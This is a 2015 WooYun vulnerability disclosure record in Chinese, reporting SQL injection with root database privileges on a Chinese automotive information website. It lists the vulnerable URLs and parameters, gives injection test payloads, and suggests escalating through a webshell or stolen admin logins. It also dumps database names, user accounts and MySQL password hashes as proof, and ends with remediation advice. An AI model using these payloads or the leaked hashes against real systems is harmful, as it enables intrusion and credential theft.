{"id": 40029, "wybug_id": "wooyun-2015-0105105", "wybug_title": "第一汽车网多处MYSQL注入(root权限)影响重要数据库", "wybug_corp": "第一汽车资讯网", "wybug_author": "大懒", "wybug_date": "2015-04-01 10:24", "wybug_open_date": "2015-05-16 16:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-16：\t细节向公众公开  简要描述： 大量重要数据库且可获取root用户的密码等 详细说明：  URL：http://www.autono1.com/e/enews/vw.php parameter：areas、bid、brands、colors、discount、mobile、price、s1、s2、title、xingming、xlyuqipayload：'and 1=1 'a'='a; ' and 1=2 'a'='a这里即存在报错注入也存在时间盲注另外的URL：http://www.autono1.com/s/bjxd/baoming.phpparameter：areas、colors、mobile、xingming、xlyuqihttp://www.autono1.com/s/bjxd/newslist.phpparameter：pagehttp://www.autono1.com/e/extend/newajax.php?atype=ibrand&_=1427802175668parameter：abrand由于是dba权限，深入下去可能有两种办法，1.借助该高权期限sql注入漏洞，写马写shell等往下渗透。2。通过数据库里的账户密码数据及找到管理后台登陆进去，进一步利用。   漏洞证明：  available databases [30]:[*] autobbs[*] autono1_2012[*] bbshome[*] cardata[*] edong[*] edscb[*] hongbao[*] information_schema[*] jnpost[*] lexus[*] mysql[*] nrunhua[*] runhua[*] swsj[*] tankdb[*] test[*] tianzhong[*] tuangou[*] uc_diaocha[*] ucenter[*] wdcpdb[*] wdhac[*] weixinwall[*] wss2107[*] wss2108[*] xiandai[*] xinfuhao[*] yingzhi[*] yishujie[*] youdi春节抢红包很火，说实话看见有hongbao这样的字眼双眼发光。database management system users [23]:[*] ''@'localhost'[*] ''@'wdos-64'[*] 'autobbs'@'localhost'[*] 'autono1'@'localhost'[*] 'cardata'@'localhost'[*] 'edong'@'localhost'[*] 'gouchehui'@'localhost'[*] 'jnpost'@'localhost'[*] 'lexus'@'localhost'[*] 'root'@'127.0.0.1'[*] 'root'@'localhost'[*] 'root'@'wdos-64'[*] 'runhua'@'localhost'[*] 'swsj'@'localhost'[*] 'tankdb'@'localhost'[*] 'tianzhong'@'localhost'[*] 'ucenter'@'localhost'[*] 'volvo'@'localhost'[*] 'wdcp'@'localhost'[*] 'weixin'@'localhost'[*] 'wss2108'@'localhost'[*] 'xinfuhao'@'localhost'[*] 'yingzhi'@'localhost'部分用户列举[*] edong [1]:    password hash: *1FF45AE74534A60E8F8EA9D9492F00C805597E90[*] gouchehui [1]:    password hash: *7C5B3E9CAD68A938BCA770AE77578A688A6CC9B9[*] jnpost [1]:    password hash: *7C5B3E9CAD68A938BCA770AE77578A688A6CC9B9[*] lexus [1]:    password hash: *79CA109367625CDA1050997D5EEDD0DD9F3608B3[*] root [2]:    password hash: *79CA109367625CDA1050997D5EEDD0DD9F3608B3    password hash: *7C5B3E9CAD68A938BCA770AE77578A688A6CC9B9[*] runhua [1]:    password hash: *79CA109367625CDA1050997D5EEDD0DD9F3608B3这里显示dba\n\n   修复方案：  1.首先最基本的特殊符号需要过滤单引号，由于不清楚斜杠、星号、#、空格、括号等对系统业务是否有影响，若无也过滤2.关键字的过滤，过滤服务端抛出sql错误信息，由于产生的原因多种多样例如可能是单引号报错也可能是其他特殊符号报错，可以选择对抛出错误的关键字对比然后清理错误信息3.构造结构化查询语句，数据是数据、指令是指令4.上waf   版权声明：转载请注明来源 大懒@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-04-01 16:33 厂商回复： 谢谢作者 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}